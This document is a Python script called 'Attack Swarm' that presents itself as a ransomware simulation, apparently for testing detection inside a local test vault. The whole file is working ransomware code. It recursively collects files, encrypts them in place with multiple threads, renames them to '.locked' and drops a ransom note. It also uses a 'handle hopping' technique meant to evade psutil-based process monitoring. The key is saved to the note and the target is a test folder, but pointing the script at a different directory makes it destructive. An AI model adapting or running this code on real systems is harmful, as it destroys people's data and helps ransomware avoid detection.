"""
Attack Swarm: Advanced Multi-Threaded Ransomware Simulation
============================================================
Features:
- Multi-Threading: 10 concurrent file encryptions
- Recursive Traversal: Finds all files including subdirectories
- Handle Hopping: Minimizes file handle visibility to evade psutil detection
- File Prioritization: Small files first, large files last
"""

import os
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from cryptography.fernet import Fernet

VAULT_DIR = "./test_vault"
MAX_WORKERS = 10  # Number of concurrent encryption threads
SMALL_FILE_THRESHOLD = 1024 * 1024  # 1MB - prioritize files smaller than this


def collect_files(base_dir):
    """Recursively collect all files using os.walk."""
    files = []
    for root, dirs, filenames in os.walk(base_dir):
        for filename in filenames:
            # Skip already encrypted files
            if filename.endswith(".locked") or filename.endswith(".encrypted"):
                continue
            full_path = os.path.join(root, filename)
            try:
                size = os.path.getsize(full_path)
                files.append((full_path, size))
            except:
                pass
    return files


def prioritize_files(files):
    """Sort files: small files first (< 1MB), then larger files."""
    # Separate into small and large files
    small_files = [(p, s) for p, s in files if s < SMALL_FILE_THRESHOLD]
    large_files = [(p, s) for p, s in files if s >= SMALL_FILE_THRESHOLD]
    
    # Sort each group by size (ascending)
    small_files.sort(key=lambda x: x[1])
    large_files.sort(key=lambda x: x[1])
    
    # Return small files first, then large files
    return [p for p, s in small_files] + [p for p, s in large_files]


def encrypt_file(file_path, fernet):
    """
    Encrypt a single file using Handle Hopping technique.
    
    Handle Hopping: Open file briefly, close it, encrypt in memory,
    then open again to write. This minimizes the time the file handle
    is visible to process monitoring tools like psutil.
    """
    try:
        # === PHASE 1: Read and immediately close ===
        with open(file_path, "rb") as f:
            original_data = f.read()
        # File handle is now CLOSED - invisible to psutil
        
        # === PHASE 2: Encrypt in memory (no file handle open) ===
        encrypted_data = fernet.encrypt(original_data)
        
        # === PHASE 3: Write and immediately close ===
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
        # File handle is now CLOSED again
        
        # === PHASE 4: Rename to show it's locked ===
        new_path = file_path + ".locked"
        os.rename(file_path, new_path)
        
        return (file_path, True, None)
    except Exception as e:
        return (file_path, False, str(e))


def attack_swarm():
    print("=" * 60)
    print("   ATTACK SWARM: Advanced Multi-Threaded Ransomware")
    print("=" * 60)
    
    if not os.path.exists(VAULT_DIR):
        print(f"[!] Error: {VAULT_DIR} not found. Run setup_vault.py first.")
        return

    # Generate encryption key
    key = Fernet.generate_key()
    fernet = Fernet(key)
    print(f"[*] Encryption Key: {key.decode()[:32]}...")
    
    # Collect all files recursively
    print(f"[*] Scanning {VAULT_DIR} for targets...")
    files_with_sizes = collect_files(VAULT_DIR)
    print(f"[*] Found {len(files_with_sizes)} files")
    
    # Prioritize: small files first
    target_files = prioritize_files(files_with_sizes)
    print(f"[*] Prioritized targets (small files first)")
    
    # Track results
    success_count = 0
    fail_count = 0
    
    print("-" * 60)
    print(f"[*] Launching attack with {MAX_WORKERS} concurrent threads...")
    print("-" * 60)
    
    start_time = time.time()
    
    # Execute with ThreadPoolExecutor - NO DELAYS!
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all encryption tasks
        futures = {
            executor.submit(encrypt_file, fp, fernet): fp 
            for fp in target_files
        }
        
        # Collect results as they complete
        for future in as_completed(futures):
            file_path, success, error = future.result()
            filename = os.path.basename(file_path)
            
            if success:
                print(f"    [!] ENCRYPTED: {file_path}")
                success_count += 1
            else:
                print(f"    [x] FAILED: {filename} - {error}")
                fail_count += 1
    
    end_time = time.time()
    elapsed = end_time - start_time
    
    print("=" * 60)
    print(f"[*] ATTACK COMPLETE")
    print(f"    - Encrypted: {success_count} files")
    print(f"    - Failed: {fail_count} files")
    print(f"    - Time: {elapsed:.4f} seconds")
    print(f"    - Speed: {success_count / elapsed:.2f} files/second")
    print("=" * 60)
    
    # Save key to ransom note (for demo purposes)
    ransom_note = os.path.join(VAULT_DIR, "README_RANSOM.txt")
    with open(ransom_note, "w") as f:
        f.write("=" * 50 + "\n")
        f.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"Decryption Key: {key.decode()}\n\n")
        f.write("This is a SIMULATION for educational purposes.\n")
        f.write("Run setup_vault.py to reset your test environment.\n")
    print(f"[*] Ransom note created: {ransom_note}")


if __name__ == "__main__":
    attack_swarm()
